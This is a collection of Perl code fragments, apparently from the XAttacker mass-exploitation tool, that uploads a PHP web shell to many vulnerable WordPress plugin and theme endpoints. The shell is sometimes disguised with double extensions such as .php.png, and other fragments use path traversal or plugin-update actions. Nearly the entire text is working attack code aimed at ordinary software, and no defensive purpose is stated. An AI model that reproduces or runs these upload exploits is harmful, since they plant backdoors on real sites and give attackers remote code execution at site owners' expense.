...
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [popimg => ["files/XAttacker.php"],]);
...
my $url = "$site/";
my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ "post" => "foobar","course_id" => "foobar","uploadfile" => "foobar",'uploadfiles[]' => ["files/XAttacker.php.docx"] ]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ "value" => "nm_personalizedproduct_upload_file","value" => "upload.php",'file' => ["files/XAttacker.phtml"] ]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ "value" => "nm_postfront_upload_file","value" => "upload.php",'file' => ["files/XAttacker.phtml"] ]);
...
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [Filedata => ["files/XAttacker.php"]]);
...
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => ['folder'=>"/wp-content/uploads", Filedata => ["files/XAttacker.php"]]);
...
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => ['config_path'=>'../../../../../../', image => ["files/XAttacker.php"]]);
...
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => ["action" => "nm_filemanager_upload_file","name" => "upload.php", file => ["files/XAttacker.php"]]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'qqfile' => ["files/XAttacker.php"] ]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ "value" => "Import",'importfile' => ["files/XAttacker.php"] ]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ "value" => "./",'uploadfile' => ["files/XAttacker.php"] ]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'userfile' => ["files/XAttacker.php"] ]);
...
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [file => ["files/XAttacker.php"]]);
...
sub jsordef(){
my $addblockurl = "$site/wp-admin/admin-ajax.php?param=upload_slide&action=upload_library";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [file => ["files/XAttacker.txt"]]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ "value" => "./",'uploadfile' => ["files/izom.php"] ]);
...
my $blazeres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["files/XAttacker.php"], task => 'blaze_add_new_album', album_name => '', album_desc => '',]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["files/XAttacker.php"], task => 'cpr_add_new_album', album_name => '', album_desc => '',]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["files/XAttacker.php"],]);
...
my $url = "$site";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [upfile => ["files/XAttacker.php"], dm_upload => '',]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["files/XAttacker.php"], task => 'drm_add_new_album', album_name => '', album_desc => '',]);
...
my $sexycontactres = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ "action" => "nm_webcontact_upload_file", $field_name => ["files/XAttacker.php"] ]
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["files/XAttacker.php"], task => 'lvo_add_new_album', album_name => '', album_desc => '',]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["files/XAttacker.php"], task => 'vrt_add_new_album', album_name => '', album_desc => '',]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["files/XAttacker.php"], task => 'carousel_add_new_album', album_name => '', album_desc => '',]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["files/XAttacker.php"], task => 'superb_add_new_album', album_name => '', album_desc => '',]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["files/XAttacker.php"], task => 'yass_add_new_album', album_name => '', album_desc => '',]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["files/XAttacker.php"], task => 'hss_add_new_album', album_name => '', album_desc => '',]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["files/XAttacker.php"], task => 'slider_add_new_album', album_name => '', album_desc => '',]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["files/XAttacker.php"], task => 'uni_add_new_album', album_name => '', album_desc => '',]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => ["xsldata" => '<? xml version = "1.0"?><xsl: stylesheet version = "1.0" xmlns: xsl = "http://www.w3.org/1999/XSL/Transform"><xsl:template match ="/"><html></html></xsl:template></xsl:stylesheet>',e_transform_file => ["files/XAttacker.php"],]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["files/XAttacker.php"], task => 'pwz_add_new_album', album_name => '', album_desc => '',]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'fileToUpload' => ["files/xAttacker.php"] ]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'fileToUpload' => ["files/izo.html"] ]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'UPLOADDIR'=>'../', 'ADMINEMAIL'=>'test@example.com', 'Filedata' => ["files/XAttcker.php"]]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'upload-favicon'=>'fake', 'iconImage' => ["files/XAttcker.php"]]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'file_field' => ["files/XAttcker.PhP.txtx"] ]);
...
my $revslidres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_plugin", update_file => ["files/XAttackerevs.zip"]]);
...
$ua->timeout(10);
$ua->agent($useragent);
my $showbizres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "showbiz_ajax_action", client_action => "update_plugin", update_file => ["files/XAttacker.php"]]);
...
my $adsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [uploadfile => ["files/XAttacker.php"], action => 'upload_ad_image', path => '',]);
...
my $slideshowres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["files/XAttacker.php"], task => 'pro_add_new_album', album_name => '', album_desc => '',]);
...
my $wysijares = $ua->post("$url", Content_Type => 'form-data', Content => [ $theme => ['files/XAttacker.zip', => 'files/XAttacker.zip'], overwriteexistingtheme => "on",action => "themeupload", submitter => "Upload",]);
...
my $inbomarketingres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["files/XAttacker.php"],]);
...
my $dzsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file_field => ["files/XAttacker.php"],]);
...
my $reflexres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["files/XAttacker.php"],]);
...
my $sexycontactres = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["files/XAttacker.php"] ]
...
$realestateup = "$site/wp-content/themes/Realestate/images/Result/XAttacker.php?X=Attacker";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [filename => ["files/XAttacker.php"], gcb_view => 'update', update_it => '1',  gcb_name => 'Foo', gcb_custom_id => '', gcb_type => 'php', gcb_description => '', gcbvalue => '$shell', gcb_updateshortcode => 'Update',]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["files/XAttacker.php.png"],]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [image => ["files/XAttacker.php.png"],]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["files/XAttacker.php.mp4"],]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', data => 'bajatax', type => 'pattern_upload', Content => [bajatax => ["files/XAttacker.php"],]);
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', data => 'bajatax', type => 'image_upload', Content => [bajatax => ["files/XAttacker.php"],]);
...
my $shell ="files/XAttacker.php.png";
my $field_name = "Filedata";
...
my $response = $ua->post( $url,
            ...
            testimonial_img => "files/XAttacker.php",
...
$filez="files/XAttacker.php.php.j";
...
my $response = $ua->post( $url,
            Cookie => "", Content_Type => "form-data", Content => [file => ["files/XAttacker.jpg"], name => "files/XAttacker.html"]
           
            );

$comadsmanagerup="$site/Result/plupload/XAttacker.html";
